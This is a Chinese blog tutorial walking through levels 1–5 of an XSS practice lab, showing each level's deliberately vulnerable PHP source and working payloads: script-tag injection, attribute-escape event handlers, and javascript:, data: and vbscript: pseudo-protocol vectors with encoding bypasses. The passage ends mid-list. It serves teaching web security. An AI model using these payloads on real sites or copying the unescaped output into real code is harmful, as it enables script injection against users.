<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_1.png" class="" title="在这里插入图片描述">

<p>外层标签是h1 文本便签，嵌入script标签的脚本可以发挥作用<br>因此，只需要属于一段完整的脚本即可</p>
<p> 源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="line"> <span class="comment">//window 在加载完所有元素后，才会执行这个语句  href=&quot;跳转链接&quot;；</span></span><br><span class="line"> <span class="comment">//在level1这一关的网页控制台输入 window.location.href=&quot;level2.php?keyword=test&quot;; 就会跳转至第二关</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];   <span class="comment">//没有进行任何过滤，直接将内容赋值给变量$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">由于没有任何过滤，只需输入简单的js代码就可以通过,例如：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"></span><br><span class="line">注意：1.不要忘记写上分号 2.探测时最好用字符串探测（可以获取网页回显的信息-&gt;判断是什么类型的防护）</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>类型：输入框类型</p>
<p>解题思路：<br>1.有输入框–&gt;value-&gt;字符逃逸<br>2.输入测试语句-&gt;查看变化处的源码(重点关注value)</p>
<p>测试语句</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alter</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_2.png" class="" title="在这里插入图片描述">
<ul>
<li><p>1.输入的语句没有缺失或者是改变</p>
</li>
<li><p>2.未输入语句时 value&#x3D;” “ ,输入后 有一部分橙色，一部分蓝色 ，一般来说，网页源代码橙色是值，蓝色是标签。</p>
</li>
</ul>
<p>出现这种情况是因为没有闭合，导致标签混乱</p>
<p>解决方法：闭合value</p>
<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="*字符逃逸"></a>*字符逃逸</h3><p>1.仅仅输入 “ ：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_3.png" class="" title="在这里插入图片描述">
<p>闭合了前引号</p>
<p>2.输入 “&gt;</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_4.png" class="" title="在这里插入图片描述">
<p>“ &gt;  逃逸出input标签，下图为此时的页面渲染</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_5.png" class="" title="在这里插入图片描述">

<p>所以只需在之后加上相应的语句即可通关</p>
<p>3.除了逃逸，还可以构造为input的属性 </p>
<p>具体语句在下方源码分析</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];  <span class="comment">//keyword的值就是value的值，即变量$_GET赋值给$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;  </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//使用转义函数（经常出现）：htmlspecialchars($str)  将$str的值进行实例化转义   --&gt;之后例子会进一步解释  注意:这里只是对输出的$str进行实例化转义</span></span><br><span class="line"><span class="comment">//htmlspecialchars() 是 PHP 中用于将特殊字符转换为 HTML 实体的函数，其主要作用是防止 XSS（跨站脚本攻击）</span></span><br><span class="line"><span class="comment">//htmlspecialchars() 默认会转义5个字符,其他字符不会转义</span></span><br><span class="line"><span class="comment">//&quot; &#x27; &lt; &gt; &amp;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//注入语句</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //    逃逸</span><br><span class="line">&quot; onclick=&#x27;alert(&quot;GGBOND)  //</span><br><span class="line">&quot; onfocus=&#x27;alert(&quot;GGBOND&quot;)  //   </span><br><span class="line">以上需要自主点击输入框</span><br><span class="line">&quot; autofocus=&#x27;alert(&quot;GGBOND&quot;)&#x27; //  </span><br><span class="line">自动点击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>类型：输入框类型</p>
<p>解题思路：<br>进行初步分析：<br>1.输入测试语句（闭合与不闭合）<br>2.查看网页源码-&gt;value的情况<br>3.选中value的值，右键选中修改html</p>
<p>查看是否被实例化转义（指value的值）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">注入语句：   &quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_6.png" class="" title="在这里插入图片描述">
<p>查看：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_7.png" class="" title="在这里插入图片描述">

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_8.png" class="" title="在这里插入图片描述">
<p>由上图可知，输入的语句被实例化转义后才作为value的值</p>
<p>在level2输入同样的语句并进行查看value</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_9.png" class="" title="在这里插入图片描述">
<p>value的值没有被实例化转义，这就是level2 与 level3 最大的区别</p>
<p>细节：alert(实例化后的内容);  从这里就可以发现：输入字符串可以获得更多的回显信息</p>
<h3 id="默认Htmlspecialchars-函数"><a href="#默认Htmlspecialchars-函数" class="headerlink" title="*默认Htmlspecialchars()函数"></a>*默认Htmlspecialchars()函数</h3><p>没有转义单引号，可以使用单引号闭合</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">//需要手动点击执行</span><br><span class="line">&#x27; onclick=&#x27;alert(&quot;123&quot;)&#x27; //    不要用双引号包裹，因为双引号会被转义</span><br><span class="line">&#x27; onclick=alert(&quot;123&quot;) //      无引号包裹，仍然可以执行</span><br><span class="line">&#x27; onfocus=console.log(&quot;123&quot;) //   控制台输出</span><br><span class="line">//自动执行</span><br><span class="line">autofocus=alert(&quot;123&quot;) //</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题：为什么不用引号包裹js函数仍然可以执行呢？</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">输入：&#x27; onclick=alert(&quot;123&quot;) //  </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_10.png" class="" title="在这里插入图片描述">
<p>浏览器会自动补全引号，即浏览器的容错功能发挥作用</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="comment">//使用实例化转义函数，默认不会转义单引号</span></span><br><span class="line"><span class="comment">//htmlspecialchars($str,ENT_QUOTES)  就会转义单引号</span></span><br><span class="line"><span class="comment">//使用实体转义函数，默认不会转义单引号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;      </span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;                                     </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;	   </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>输入测试语句</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_11.png" class="" title="在这里插入图片描述">
<p>检查是否被实例化转义</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_12.png" class="" title="在这里插入图片描述">

<ul>
<li>&lt; &gt; &#x2F; 别替换为空  </li>
<li>alert括号中的双引号没有没替换或是实例化转义，即没有过滤双引号</li>
<li>输入的语句有橙色，蓝色部分（被浏览器当作标签）</li>
<li>alert括号内的第一个双引号与value的第一个双号闭合，之后的内容均被认定为标签</li>
</ul>
<p>尝试闭合</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_13.png" class="" title="在这里插入图片描述">
<p>闭合成功，但注入语句仍被该标签包含，不能发挥作用</p>
<h3 id="插入属性"><a href="#插入属性" class="headerlink" title="*插入属性"></a>*插入属性</h3><p>由于&lt;  &gt; &#x2F; 均被过滤，插入一个完整的标签比较困难，可以选择插入属性</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br><span class="line">用&#x27;无法闭合value的双引号</span><br></pre></td></tr></table></figure>

<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);  <span class="comment">//错误展示，0表示不展示错误，即服务器关闭错误回显</span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);   <span class="comment">//str_resplace(&quot;被替换字符&quot;,&quot;替换字符&quot;,变量)</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//没有使用 Htmlspecialchars函数对字符进行实例化转义</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>解题思路：</p>
<p>类型：输入框类型</p>
<p>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_14.png" class="" title="在这里插入图片描述">

<ul>
<li>括号内的双引号没有被替换或实例化转义</li>
<li>括号内的双引号与value的双引号闭合</li>
<li>分为橙色，蓝色蓝部分</li>
<li>script标签背替换</li>
</ul>
<p>尝试闭合</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_15.png" class="" title="在这里插入图片描述">

<ul>
<li>闭合后标签逃逸input标签</li>
<li>script标签被改变</li>
</ul>
<p>既然标签被破坏，尝试注入属性</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_16.png" class="" title="在这里插入图片描述">
<p>onclick 属性也被替换</p>
<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="*伪协议"></a>*伪协议</h3><blockquote>
<p>在 Web 安全中，“伪协议”（Pseudo-protocol）特指浏览器支持的某些特殊 URL 协议格式，它们并非真正的网络传输协议（如 http:&#x2F;&#x2F; 或 https:&#x2F;&#x2F;），而是用于触发特定行为或执行代码。在 XSS（跨站脚本攻击） 场景中，伪协议常被用来绕过过滤规则，直接注入恶意脚本。</p>
</blockquote>
<blockquote>
<p>1.javascript:在 URL 中执行			XSS 攻击 -&gt; JavaScript 代码	javascript:alert(1)<br>2.data:嵌入 Base64 编码的内容（HTML&#x2F;脚本等过内容安全策略（CSP）-&gt;			 data:text&#x2F;html,[script]alert(1)[&#x2F;script]<br>3.vbscript:在旧版 IE 中执行 VBScript 代码 IE 特定漏洞  -&gt;   vbscript:MsgBox(“XSS”)<br>4.about:显示浏览器内部信息或空白页面	 -&gt;   about:blank</p>
</blockquote>
<ul>
<li>js协议:最常见的 XSS 利用方式，通过将伪协议注入到允许 URL 的属性中（如 <a> 标签的 href），触发脚本执行</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">基本格式  javascript:JavaScript代码        //注意：若js代码有多行，用分号分割</span><br><span class="line">若要进行编码绕过时，要对&#x27; :JavaScript代码  &#x27; //注意：这一部分进行编码（包括冒号）-&gt; 浏览器会自动解码</span><br><span class="line">返回值为空，为避免因返回值影响页面行为 设置void(0)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>常用语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>点击触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span>       				//注入 javascript: 触发点击执行</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:&#x27;alert(1)&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>                      //利用 javascript: 动态写入内容</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>        				  //使用 URL 编码或 Unicode 绕过关键字过滤，解码即为javascript</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     	 //利用 onclick 事件覆盖 href 行为（需用户交互）</span><br></pre></td></tr></table></figure>
<ul>
<li>data协议：通过嵌入 Base64 编码的 HTML 或脚本，绕过某些过滤规则：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">基本格式 data:[<span class="tag">&lt;<span class="name">MIME类型</span>&gt;</span>][;charset=<span class="tag">&lt;<span class="name">字符集</span>&gt;</span>][;base64],<span class="tag">&lt;<span class="name">数据内容</span>&gt;</span></span><br><span class="line">1.MIME 类型：声明数据类型（如 text/html、text/javascript）。</span><br><span class="line">2.Base64 编码：可选参数，用于编码二进制或特殊字符内容。</span><br><span class="line">3.浏览器支持：现代浏览器广泛支持，但受 CSP（内容安全策略）限制。</span><br><span class="line"></span><br><span class="line">攻击形式：参考以下常用语句</span><br></pre></td></tr></table></figure>
<p>常用语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>  		//object 标签的 data 属性注入 Base64 编码的脚本</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span> 		  //iframe 的 src 属性，通过 data: 加载恶意 HTML</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  						//省略 MIME 类型，某些浏览器允许省略 text/html 声明</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/javascript,alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 							  //结合 JavaScript 执行，直接通过 data: 执行 JS 代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>vbscript协议：仅适用于旧版 IE，执行 VBScript 代码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;vbscript:MsgBox(&#x27;XSS&#x27;)&quot;</span>&gt;</span>触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>bout:通常用于加载空白页面，但可能结合其他漏洞利用</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;about:blank&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正式解题：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">示例1：</span><br><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br><span class="line">解释：&quot;闭合value的双引号，紧跟的&gt;与&quot;共同实现字符逃逸，使用<span class="tag">&lt;<span class="name">a</span>&gt;</span>标签的属性href+js协议</span><br></pre></td></tr></table></figure>
<p>网页源码：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_17.png" class="" title="在这里插入图片描述">
<p>页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_18.png" class="" title="在这里插入图片描述">
<p>点击超链接‘1’，即可通关</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">示例2：</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //</span><br><span class="line">动态创建标签页面，当标签页面被创建时自动执行js代码</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_19.png" class="" title="在这里插入图片描述">
<p>此时的页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_20.png" class="" title="在这里插入图片描述">

<h3 id="趣事"><a href="#趣事" class="headerlink" title="*趣事"></a>*趣事</h3><p>此时你不断刷新页面，页面会不断弹框（刷新一次弹框一次）</p>
<p>对于js协议的剩下编码示例与onclick覆盖就不再演示,以下为具体输入语句：</p>
